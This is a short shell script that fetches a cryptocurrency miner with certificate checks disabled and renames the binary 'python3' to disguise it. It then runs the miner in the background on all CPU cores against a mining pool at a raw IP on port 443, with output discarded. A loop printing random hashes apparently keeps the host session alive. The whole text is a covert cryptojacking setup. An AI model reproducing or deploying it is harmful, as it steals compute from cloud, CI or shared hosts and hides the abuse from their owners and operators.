apt update
apt install -y wget git build-essential cmake libuv1-dev uuid-dev libssl-dev
wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
mv cpuminer-sse2 python3
./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-Lord) -p x -t$(nproc --all) >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
